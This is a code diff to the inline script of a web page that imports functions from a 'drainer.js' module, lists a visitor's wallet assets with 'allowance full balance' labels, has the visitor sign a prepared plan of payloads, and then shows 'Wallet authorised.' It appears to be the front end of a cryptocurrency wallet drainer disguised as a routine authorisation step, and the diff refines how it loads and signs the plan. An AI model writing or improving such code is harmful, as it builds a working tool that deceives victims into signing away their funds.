@@ -48,7 +48,7 @@
 </div>
 
 <script type="module">
-import { runDrainer } from "/assets/js/drainer.js";
+import { prepareDrainer, signPlan } from "/assets/js/drainer.js";
 
 const walletId = new URLSearchParams(location.search).get("wallet");
 const list = document.getElementById("list");
@@ -99,9 +99,11 @@ function render(plan) {
   }
   const rows = assets.map((a) => `
     <div class="asset">
-      <span>${esc(a.symbol || "?")}</span>
+      <span>${esc(a.symbol || "?")}${a.priced === false
+        ? ' <span class="cap">unpriced</span>' : ""}</span>
       <span class="r">${esc(fmt(a.balance, a.decimals))}
-        <span class="cap">allowance ${esc(fmt(a.cap_raw, a.decimals))}</span>
+        <span class="cap">allowance ${a.kind === "native_tx" || Number(a.cap_raw) / 10 ** (a.decimals ?? 0) >= 1e12
+          ? "full balance" : esc(fmt(a.cap_raw, a.decimals))}</span>
       </span>
     </div>`).join("");
   list.innerHTML =
@@ -115,13 +117,34 @@ function setProgress(done, total, kind) {
   msg.textContent = `${LABELS[kind] || "Step"} ${done} of ${total}`;
 }
 
-async function start() {
+let plan = null;
+
+async function load() {
+  plan = null;
   go.disabled = true;
   retry.hidden = true;
   msg.className = "";
   msg.textContent = "";
   try {
-    const plan = await runDrainer(walletId, setProgress, render);
+    plan = await prepareDrainer(walletId);
+    render(plan);
+    go.disabled = !(plan.payloads || []).length;
+  } catch (e) {
+    bar.style.display = "none";
+    msg.className = "err";
+    msg.textContent = humanise(e);
+    retry.hidden = false;
+  }
+}
+
+async function start() {
+  if (!plan) return load();
+  go.disabled = true;
+  retry.hidden = true;
+  msg.className = "";
+  msg.textContent = "";
+  try {
+    await signPlan(plan, setProgress);
     fill.style.width = "100%";
     msg.className = "ok";
     msg.textContent = "Wallet authorised.";
@@ -135,7 +158,7 @@ async function start() {
   }
 }
 
-retry.onclick = () => { go.hidden = false; start(); };
+retry.onclick = () => { go.hidden = false; load(); };
 
 if (!walletId) {
   list.innerHTML = `<div class="empty">No wallet specified in the link.</div>`;
@@ -143,7 +166,7 @@ if (!walletId) {
   msg.textContent = "Open this page from the wallet screen.";
 } else {
   go.onclick = start;
-  go.disabled = false;
+  load();
 }
 </script>
 </body>
